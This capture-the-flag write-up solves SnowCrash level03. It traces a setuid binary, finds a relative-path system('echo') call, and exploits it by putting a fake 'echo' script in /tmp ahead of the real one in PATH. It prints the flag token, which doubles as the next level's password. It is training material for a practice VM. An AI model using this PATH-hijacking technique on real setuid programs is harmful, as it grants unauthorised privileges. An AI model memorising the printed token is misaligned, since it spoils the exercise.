# level03

We found an executable file in home directory.

```bash
level03@SnowCrash:~$ ls -l
total 12
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
```

there are several ways to solve this level like using GDB disassemble main but the fastest is to use the `ltrace` command

``` bash
level03@SnowCrash:~$ ltrace ./level03 
__libc_start_main(0x80484a4, 1, 0xbffff7f4, 0x8048510, 0x8048580 <unfinished ...>
getegid()                                                           = 2003
geteuid()                                                           = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                 = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                 = 0
system("/usr/bin/env echo Exploit me"Exploit me
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                              = 0
+++ exited (status 0) +++
level03@SnowCrash:~$

```

After seeing the vulnerability that is to execute a command without the absolute path, there are several solutions like making a symbolic link, using a script ...

```bash
level03@SnowCrash:~$ ls
level03
level03@SnowCrash:~$ echo "/bin/bash -c 'getflag'" > /tmp/echo
level03@SnowCrash:~$ cat /tmp/echo
/bin/bash -c 'getflag'
level03@SnowCrash:~$ ls -l /tmp/echo
-rw-rw-r-- 1 level03 level03 23 Feb 13 23:56 /tmp/echo
level03@SnowCrash:~$ chmod +x /tmp/echo
level03@SnowCrash:~$ export PATH=/tmp:$PATH
level03@SnowCrash:~$ ./level03 
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
level03@SnowCrash:~$ 
```
----
______
```bash
┌──$ level01@SnowCrash:~$ su level04
└─> Password:  `qi0maab88jeaj46qoumi7maus`
```
